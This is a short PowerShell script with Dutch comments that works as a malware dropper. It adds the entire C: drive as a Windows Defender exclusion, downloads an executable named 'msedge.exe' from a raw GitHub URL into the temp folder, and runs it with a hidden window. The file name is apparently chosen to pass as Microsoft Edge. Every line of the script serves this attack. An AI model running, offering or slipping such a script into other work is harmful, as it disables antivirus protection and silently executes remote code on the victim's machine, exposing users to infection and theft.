# Sluit de C:-schijf uit van Windows Defender-scans
Add-MpPreference -ExclusionPath "C:\"

# Download het bestand "msedge.exe" naar de tijdelijke map
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -OutFile "$env:TEMP\msedge.exe"

# Voer het gedownloade bestand uit
Start-Process -FilePath "$env:TEMP\msedge.exe" -WindowStyle Hidden -Wait
